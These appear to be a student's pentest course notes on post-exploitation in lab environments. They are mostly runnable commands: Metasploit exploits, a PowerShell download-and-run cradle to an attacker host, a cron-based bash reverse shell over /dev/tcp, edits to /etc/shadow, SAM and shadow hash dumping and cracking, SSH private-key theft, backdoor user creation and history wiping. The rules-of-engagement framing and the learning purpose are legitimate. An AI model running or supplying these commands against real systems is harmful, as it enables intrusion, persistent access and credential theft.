# 10. Post-exploitation

### Introduction

#### Definition

* Post-exploitaiton is the final phase of the penetration testing process and consists of the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.
* In other words, post-exploitation involves what you do or have to do once you gain an initial foothold on the target system.
* Post-exploitation will differ based on the target operating system as well as the target infrastructure.
* The post-exploitation techniques and tools that you can use will depend on what kind of access you have on the system you have compromised as well as how stealthy you have to be.
* This ultimately means that you will need to utilize different techniques and tools based on the target operating system and its configuration.
* The post-exploitation techniques you can run against the target will need to abide by the rules of engagement aggreed upon with the client you are performing the pentest for.

_Note : when running post-exploitation techniques, you need to be sure that you have the necessary permissions and rights to modify services, system configurations, perform privilege escalation, delete logs etc._

#### Methodology

* In order to perform a thorough and complete post-explotation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagments.
* This structured, methodological approach ensures that we do not skip/overlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

1. Local enumeration
   * [ ] Enumerating system information
   * [ ] Enumerating users and groups
   * [ ] Enumerationg network information
   * [ ] Enumerating services
   * [ ] Automating local enumeration
2. Transferring files
   * [ ] Setting up a web server with Python
   * [ ] Transferring files to Windows targets
   * [ ] Transferring files to Linux targets
3. Upgrading shells
   * [ ] Upgrading command shells to meterpreter
   * [ ] Spawning tty shells
4. Privilege escalation
   * [ ] Identifying privesc vulns
   * [ ] Windows privesc
   * [ ] Linux privesc
5. Persistence
   * [ ] Setting up persistence on Windows
   * [ ] Setting up persistence on Linux
6. Dumping & cracking hashes
   * [ ] Dumping & cracking Windows hashes
   * [ ] Dumping & cracking Linux hashes
7. Pivoting
   * [ ] Internal network recon
   * [ ] Pivoting
8. Clearing your tracks
   * [ ] Clearing your tracks on Windows & Linux

### Windows local enumeration

#### System information

* After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run?
* What are we looking for?
  * Hostname
  * OS name
  * OS build & service pack
  * OS architecture
  * Installed updates/hotfixes

```
C:\> systeminfo
C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
C:\> more C:\Windows\System32\eula.txt
```

#### Users & groups

* After gaining initial access to a target system, it is always important to learn more about the system like, what use account you have access to and other user accounts on the system.
* What are we looking for?
  * Current user & privileges
  * Additional user information
  * Other users on the system
  * Groups
  * Members of the built-in administrator group

```bash
msf6> use exploit/windows/rejetto_hfs_exec
msf6> set rhosts 10.3.21.106
msf6> run

meterpreter> getuid    # current user
meterpreter> getprivs  # privileges
meterpreter> background

# module to enumerate users
msf6> use post/windows/gather/enum_logged_on_users
msf6> set session 1
msf6> run
msf6> cat /root/.msf4/loot/20230808180117_default_10.3.21.106_host.users.activ_810414.txt
msf6> sessions 1

meterpreter> shell
C:\> whoami                  # current user
C:\> whoami /priv            # privileges
C:\> query user              # logged on users
C:\> net user                # user list
C:\> net user administrator  # additional information about user
C:\> net localgroup          # group list
```

#### Network information

* What are we looking for?
  * Current IP address & network adapter
  * Internal networks
  * TCP/UDP services running and their respective ports
  * Other hosts on the network
  * Routing table
  * Windows firewall state

```bash
C:\> ipconfig                         # network interface list
C:\> ipconfig /all                    # network interface configuration
C:\> route print                      # IP table routes
C:\> arp -a
C:\> netstat -ano                     # open ports
C:\> netsh advfirewall firewall show  # firewall rules
```

#### Processes & services

* After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.
* What are we looking for?
  * Running processes & services
  * Scheduled tasks
* A **process** is an instance of a running executable `.exe` or program.
* A **service** is a process which runs in the background and does not interact with the desktop.

**Meterpreter**

```bash
meterpreter> ps                  # running processes
meterpreter> pgrep explorer.exe
meterpreter> migrate 2176        # migrate to a x64 arch process
```

**Shell**

```bash
C:\> net start
C:\> wmic service list brief
C:\> tasklist /svc
C:\> schtasks /query /fo LIST /v
```

#### Automate enumeration

* In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.
* While local enumeration techniques/commands are important to know, as a penetration tester, you will need to be time efficient. As a result, you will need to learn how to utilize various automated enumeration scripts.
* In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords etc.
* JAWS (Just Another Windows Script) : it is a PowerShell script designed to help penetration tester (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7 (https://github.com/411Hall/JAWS).

**win\_privs**

```bash
kali@kali> service postgresql start && msfconsole

msf6> db_nmap 10.3.22.17 -sV -p 5985
msf6> use exploit/windows/winrm/winrm_script_exec
msf6> set rhosts 10.3.22.17
msf6> set username administrator
msf6> set password tinkerbell
msf6> set force_vbs true
msf6> run

meterpreter> getuid  # NT AUTHORITY\SYSTEM
meterpreter> background

msf6> use post/windows/gather/win_privs
msf6> set session 1
msf6> run
```

**enum\_logged\_on\_users**

```bash
msf6> use post/windows/gather/enum_logged_on_users
msf6> set session 1
msf6> run
```

**checkvm**

```bash
msf6> use post/windows/gather/checkvm
msf6> set session 1
msf6> run
```

**enum\_applications**

```bash
msf6> use post/windows/gather/enum_applications
msf6> set session 1
msf6> run
```

**enum\_computers**

```bash
msf6> use post/windows/gather/enum_computers
msf6> set session 1
msf6> run
```

**enum\_patches**

```bash
msf6> use post/windows/gather/enum_patches
msf6> set session 1
msf6> run
```

**enum\_shares**

```bash
msf6> use post/windows/gather/enum_shares
msf6> set session 1
msf6> run
```

**JAWS**

```powershell
PS> git clone https://github.com/411Hall/JAWS.git
PS> cd JAWS
PS> .\jaws-enum.ps1
```

### Linux local enumeration

#### System information

After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.

What are we looking for?

* Hostname
* Distribution & distribution release version
* Kernel version & architecture
* CPU information
* Disk information & mounted drives
* Installed packages/software

```bash
kali@kali> nmap -sV 192.8.246.3
kali@kali> msfconsole

msf6> setg rhosts 192.8.246.3
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> run

# CTRL+Z

msf6> sessions -u 1
msf6> sessions 2

meterpreter> shell
/bin/bash -i
root@victim> hostname
```

| Command             | Description                                               |
| ------------------- | --------------------------------------------------------- |
| `hostname`          | The computer name.                                        |
| `cat /etc/issue`    | The OS version.                                           |
| `cat /etc/*release` | The OS releases.                                          |
| `uname -a`          | Display hostname, kernel version, datetime, architecture. |
| `uname -r`          | Kernel version.                                           |
| `env`               | Environment variables for the current user.               |
| `lscpu`             | CPU information.                                          |
| `free -h`           | RAM consumed.                                             |
| `df -h`             | List of file systems.                                     |
| `df -ht ext4`       | Filter on type `ext4`.                                    |
| `lsblk`             | List partitions.                                          |
| `dpkg -l`           | All installed packages.                                   |

#### Users & groups

After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.

What are we looking for?

* Current user & privileges
* Other users on the system
* Groups

```bash
msf6> db_nmap -sV 192.144.183.3
msf6> setg rhosts 192.144.183.3
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set username administrator
msf6> set password tinkerbell
msf6> run
# CTRL+Z
msf6> sessions -u 1
msf6> sessions 2
meterpreter> shell
/bin/bash -i
root@victim> id  # root
```

| Command                        | Description                                                                                                   |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------- |
| `groups root`                  | The groups the user `root` is part of.                                                                        |
| `cat /etc/passwd`              | Display user & service accounts. A user account has a shell at the end of line like `/bin/bash` or `/bin/sh`. |
| `groups`                       | The current user groups.                                                                                      |
| `useradd -m john -s /bin/bash` | Create a user john with a home directory and a login shell.                                                   |
| `usermod -aG root bob`         | Add bob to the root group.                                                                                    |
| `last`                         | Show the last users logged on.                                                                                |
| `lastlog`                      | Display all information about logged in users via SSH.                                                        |

#### Network information

What are we looking for?

* Current IP address & network adapter
* Internal networks
* TCP/UDP services running and their respective ports
* Other hosts on the network

```bash
msf6> setg rhosts 192.206.83.2
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set username administrator
msf6> set password tinkerbell
msf6> run
# CTRL+Z
msf6> sessions -u 1
msf6> sessions 2
meterpreter> shell
/bin/bash -i
root@victim> id  # root
```

| Command                | Description               |
| ---------------------- | ------------------------- |
| `ifconfig` `ip a s`    | Network interfaces.       |
| `netstat`              | Current TCP/UDP services. |
| `route`                | Route table.              |
| `cat /etc/networks`    | Networks file.            |
| `cat /etc/hostname`    | Hostname file.            |
| `cat /etc/hosts`       | Local DNS file.           |
| `cat /etc/resolv.conf` | The default DNS.          |
| `arp`                  | The ARP table.            |

#### Processes & cron jobs

After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and sheduled tasks are currently running.

What are we looking for?

* Running services
* Cron jobs

```bash
msf6> setg rhosts 192.206.83.2
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set username administrator
msf6> set password tinkerbell
msf6> run
# CTRL+Z
msf6> sessions -u 1
msf6> sessions 2
meterpreter> shell
```

| Command             | Description                              |
| ------------------- | ---------------------------------------- |
| `ps`                | Process list.                            |
| `pgrep vsftpd`      | Process PID.                             |
| `top`               | List of all running processes (dynamic). |
| `crontab -l`        | List of cronjobs for the current user.   |
| `ls -la /etc/cron*` | Cron files.                              |
| `cat /etc/cron*`    | Display cron file contents.              |

#### Automation

* In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.
* While local enumeration techniques/commands are important to know, as a penetration tester, you will need to be time efficient. As a result, you will need to learn how to utilize various automated enumeration scripts.
* In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation, locally stored passwords etc.
* LinEnum : it is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities (https://github.com/rebootuser/LinEnum).

```bash
msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6> set targeturi /gettime.cgi
msf6> set rhosts 192.106.15.3
msf6> run
meterpreter> background
```

The MSF post-exploitation modules are :

* `post/linux/gather/enum_configs`
* `post/linux/gather/enum_network`
* `post/linux/gather/enum_system`
* `post/linux/gather/checkvm`

**LinEnum**

The script is here : https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh. Copy/paste the content in a bash file in the lab environment.

```bash
meterpreter> cat /etc/shells  # installed shells
meterpreter> cd /tmp
meterpreter> curl -o linenum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
meterpreter> chmod +x linenum.sh
meterpreter> ./linenum.sh
```

### Upgrading shells

```bash
/bin/bash -i
python -c "import pty;pty.spawn('/bin/bash')"
perl -e 'exec "/bin/bash"'

root@victim> env
root@victim> export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@victim> env
root@victim> export TERM=xterm
root@victim> export SHELL=bash
```

### Windows privilege escalation

#### PrivEscCheck

* In order to elevate your privileges on Windows, you must first identify privilege escalation vulnerabilities that exist on the target system.
* This process will differ greatly on the type of target you gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration.
* This process can be quite tedious and time consuming and as a result, it is recommended to automate the processes of identifying privilege escalation vulnerabilities. This can be done through the use of various automation scripts
* **PricescCheck** is a script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post-exploitation (https://github.com/itm4n/PrivescCheck).

```bash
msf6> use exploit/multi/script/web_delivery
msf6> set LHOST eth1
msf6> set target PSH\ (Binary)
msf6> set PSH-EncodedCommand false
msf6> run
```

It open a web listener on the attacker and generate a piece of PowerShell code :

```powershell
powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\i8O16o8J.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.9.2:8080/sNfNARVJQJl', $z); invoke-item $z
```

Copy/paste this code on the target prompt command and the attacker gets a reverse shell on his terminal.

```bash
msf6> use post/multi/manage/shell_to_meterpreter
msf6> set win_transfer VBS
msf6> set session 1
msf6> run

meterpreter> pgrep explorer
meterpreter> migrate 4992
meterpreter> shell
```

With meterpreter, go to `c:\\users\student\desktop\privesccheck` and execute these commands in the privesc directory.

```bash
C:\> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

Credentials : `administrator:hello_123321`. Open a PowerShell terminal as administrator and enter the password.

```powershell
PS> more c:\users\administrator\desktop\flag.txt
```

#### Authenticate as administrator

**Method 1 :** PSExec

```bash
kali@kali> psexec.py administrator@10.3.29.122  # administrator:hello_123321
```

**Method 2 :** MSF module

```bash
msf6> use exploit/windows/smb/psexec
msf6> set rhosts 10.3.29.122
msf6> set smbuser administrator
msf6> set smbpass hello_123321
msf6> run
```

### Linux privilege escalation

#### Weak permissions

Here the `/etc/shadow` file is writable, inject a new password for `root`.

```bash
student@kali> find / -not -type l -perm -o+w
student@kali> cat /etc/shadow
student@kali> openssl passwd -1 -salt abs password123
# The output is the hash $1$abs$d0N35Mn8MMuul2VQClbOx1
student@kali> vi /etc/shadow
```

```bash
student@kali> su root  # password123
root@kali> cat /root/flag
```

#### SUDO privileges

```bash
kali@kali> sudo -l
kali@kali> sudo /usr/bin/man ls
```

Once you are in the manual page, type `/bin/bash` and it will open a root terminal.

```bash
root@kali> cat /root/flag
```

### Windows persistence

#### Create a new service

* Persistence consists of techniques that adversairies use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code
* Gaining an initial foothold is not enough, you need to setup and maintain persisten access to your targets.
* Reference on https://attack.mitre.org.

_Note: the persistence technique you use will need to be in accordance with the rules of engagment laid out agreed upon with the client._

```bash
# exploit
msf6> use exploit/windows/http/rejetto_hfs_exec
msf6> set rhosts 10.3.17.79
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run
meterpreter> background
# persist
msf6> use exploit/windows/local/persistence_service
msf6> set session 1
msf6> set lport 4445
msf6> run
# kill
msf6> sessions -K
# backdoor
msf6> use multi/handler
msf6> set lhost eth1
msf6> set lport 4445
msf6> run
meterpreter> getuid  # NT AUTHORITY\SYSTEM
```

#### Create a new user

Create a new user then login with RDP protocol.

```bash
# exploit
msf6> use exploit/windows/http/badblue_passthru
msf6> setg rhosts 10.3.30.156
msf6> run
# create new user john:password_123321
meterpreter> un getgui -e -u john -p pass_123321
```

Once you created the user, connect to the target via RDP.

```bash
kali@kali> xfreerdp /u:john /p:pass_123321 /v:10.3.30.156
```

### Linux persistence

#### SSH keys

* Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.
* If SSH is enablied and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
* In most cases Linux server will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password.
* After gaining access to a Linux system we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.

```bash
# copy the victim private key into local
root@attack> scp student@192.59.82.3:~/.ssh/id_rsa .
root@attack> chmod 400 id_rsa
root@attack> ssh student@192.59.82.3
student@victim> rm /home/student/wait
# get kicked out
root@attack> ssh student@192.59.82.3
student@victim> cat /home/student/flag.txt
```

#### Cron jobs

* Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
* An application, or script that has been configured to be run repeatedly with Cron is know as a Cron job.
* We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

```bash
root@attacker> ssh student@192.246.71.3  # student:password
student@victim> echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.246.71.2/1234 0>&1'" > cron
student@victim> crontab -i cron
student@victim> crontab -l
student@victim> rm wait
root@attacker> nc -lnvp 1234
# wait max 1 minute
student@victim> cat flag.txt
```

### Dumping & cracking Windows hashes

#### Definition

* The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
* Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
* Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
* Windows versions up to Windows Server 2003 utilize two differents types of hashes :
  * LM
  * NTLM
* Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.

#### SAM database

* SAM is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
* The SAM database file cannot be copied while the OS is running.
* The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
* In modern versions of Windows, the SAM database is encrypted with a syskey.

\*Note: elevated/administrative privileges are required in order to access and interact the LSASS process.

```bash
msf6> use exploit/windows/http/badblue_passthru
msf6> set rhosts 10.3.30.237
msf6> run
meterpreter> hashdump
```

The hashes are :

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Paste this content in a file named `hashes` then run the below command.

#### John The Reaper

```bash
kali@kali> john --format=NT hashes
```

#### Hashcat

```bash
kali@kali> gzip -d /usr/share/wordlists/rockyou.txt.gz
kali@kali> hashcat -a 0 -m 1000 hashes -w /usr/share/wordlists/rockyou.txt
```

The credentials are `administrator:password` `bob:password1`.

### Dumping & cracking Linux hashes

* Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
* All of the information for all accounts on Linux is stored in the file `/etc/passwd`.

```bash
msf6> setg rhosts 192.255.149.3
msf6> use exploit/unix/ftp/proftpd_133c_backdoor
msf6> run
# CTRL+Z
msf6> sessions -u 1
mfs6> sessions 2
meterpreter> cat /etc/shadow
```

The root hash is in SHA512.

```
$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.
```

The other method is using MSF post-exploitation module.

```bash
msf6> use post/linux/gather/hashdump
msf6> set session 2
msf6> run
```

**Crack with John**

```bash
kali@kali> gzip -d /usr/share/wordlists/rockyou.txt.gz
kali@kali> john --format=sha512crypt /root/.msf4/loot/20230811072245_default_192.255.149.3_linux.hashes_377820.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Crack with Hashcat**

```bash
kali@kali> hashcat -a 3 -m 1800  /root/.msf4/loot/20230811072245_default_192.255.149.3_linux.hashes_377820.txt /usr/share/wordlists/rockyou.txt
```

The credentials are `root:password`.

### Clearing your tracks

#### Windows

* The exploitation and post-exploitation phases of a penetration test involves actively engaging with target systems and the data that is stored on these systems.
* As a result, you may be required to clear/undo any changes you have made to the target systems you have compromised based on the guidelines specified in the rules of engagment.
* If you have transferred any files to the target systems you have compromised, keep track of chere they have been saved so that you can remove them when done.
* A good practive is to store all your scripts, exploits and binaries in the `C:/Temp` directory on Windows and the `/tmp` directory on Linux.
* It is also important to consider the exploitation framework you are using, an example of this is MSF, which notorious for generating and storing artifacts on the target system when using exploit or post modules.
* Some well designed MSF modules provide you with instructions and resource scripts that provide you with information regarding where the artifacts are stored and how they can be removed.
* In the context of Windows, a typical post-exploitation technique pertinent to clearing your tracks is to delete the Windows Event Log. This is something that should be avoided during a penetration test as the Windows Event Log stores a lot of data that is important to the client you are performing the penetration test for.

```bash
msf6> use exploit/windows/local/persistence_service
msf6> set session 1
msf6> set lport 445
msf6> run
```

Once you run the command, you can go to loot and copy the path file of the module script.

```bash
msf6> resource /root/.../script
```

#### Linux

```bash
msf6> set rhosts 192.143.174.3
msf6> use exploit/linux/samba/is_known_pipename
msf6> run

/bin/bash -i

root@victim> cd /tmp
root@victim> history -c                     # method 1
root@victim> cat /dev/null > .bash_history  # method 2
```
